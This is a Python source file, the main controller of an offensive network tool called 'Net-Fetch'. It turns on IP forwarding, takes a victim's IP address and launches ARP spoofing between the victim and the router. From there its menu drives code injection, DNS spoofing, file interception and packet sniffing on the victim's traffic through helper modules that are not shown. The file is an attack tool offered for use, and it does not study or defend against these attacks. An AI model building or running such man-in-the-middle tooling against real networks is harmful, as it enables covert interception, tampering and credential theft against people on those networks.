#!/usr/bin/env python
import sys
import assets.netscan as scan
import os
import threading
from time import sleep
import subprocess
import assets.arp_spoof as arpspf
import assets.dns_spoofer as dns_spoof
import assets.code_injector as code_inj
import assets.file_interceptor as file_re
from assets.banner import showheader, usage_warning



def exit_func():
	subprocess.call("bash -c 'echo 0 > /proc/sys/net/ipv4/ip_forward'", shell=True)
	try:
		os.remove("/tmp/net_fetch_arp.log")
		os.system("iptables --flush")
		os.system("service apache2 stop")
	except:
		pass

def arp_response():
	sleep(2)
	os.system("xterm -geometry 100x24 -hold -e 'tail -F /tmp/net_fetch_arp.log 2> /dev/Packet_Log'")

def target_f():
	subprocess.call("bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'", shell=True)
	user_inside_target = 0
	target_ip = raw_input("Target IP>>").lower()
	router_ip = str(subprocess.check_output("ip route show | grep -i 'default via'| awk '{print $3 }'", shell=True))
	if target_ip == "":
		print("Please specify a target.")
		target_f()
	start_arp = threading.Thread(target=arpspf.arp_try, args=(target_ip,router_ip))
	start_arp.daemon = True
	start_arp.start()

	arp_response_thread = threading.Thread(target=arp_response)
	# arp_response_thread.daemon = True
	arp_response_thread.start() 


	while user_inside_target != "back":
		print("\n1.Code Injector")
		print("2.DNS spoofer")
		print("3.File Interceptor")
		print("4.Packet Sniffer")
		print("Back - previous windows")
		print("Exit")
		user_inside_target = raw_input("what will you select >>  ").lower()
		if user_inside_target == "1":
			print ("in code Injector")
			code_inj.main()
			# arp_thread_restart()
		elif user_inside_target == "2":
			print ("in dns spoofer")
			dns_spoof.main()
			# arp_thread_restart()
		elif user_inside_target == "3":
			print ("in file interceptor")
			file_re.main()
			# arp_thread_restart()
		elif user_inside_target == "4":
			print ("in packet sniffer")
			print("\n[+]Packet Sniffing on " + target_ip)
			print("\n[+]'Ctrl + c' to stop.")
			os.system("xterm -geometry 100x24 -hold -e 'python assets/packet_sniffer.py' ")
			# arp_thread_restart()
		elif user_inside_target == "exit":
			print("\n\nshutting down(-_-)")	
			sys.exit(0)
		elif user_inside_target == "back":
			break
		else:	
			print("\nInvalid choice")


# def arp_thread_restart():
# 	if arp_response_thread.is_alive():
# 		pass
# 	else:
# 		arp_response_thread = threading.Thread(target=arp_response)
# 		arp_response_thread.daemon = True
# 		arp_response_thread.start()


def home():
	print(showheader()) # showing net-fetch banners.
	usage_warning()
	user_input = 0    	# intialising user_input.
	try:
		print("Please type 'help' for more info")
		while user_input != "exit" : 
			user_input = raw_input("\nNet-Fetch >> ").lower()
			if user_input == "help" : 
					print("help - print this message.")
					print("exit - exit the program.")
					print("scan - scan your network for targets.")
					print("target - for attacking targets.")
			elif user_input == 'target':
				target_f()
			elif user_input == "scan":
				scan_obj = scan.main()
			elif user_input == 'exit':
				print("\n\nshutting down(-_-)")
				exit_func()
				sys.exit(0)
			else:
				print("Invalid Choice")
	except KeyboardInterrupt:
			exit_func()
			print("\nYou Killed It!")


# Checking for root previleges.
if not os.geteuid() == 0:
    sys.exit("[!] You Don't have super powers to run Net-fetch.")

# home is equivilant to main function.
home()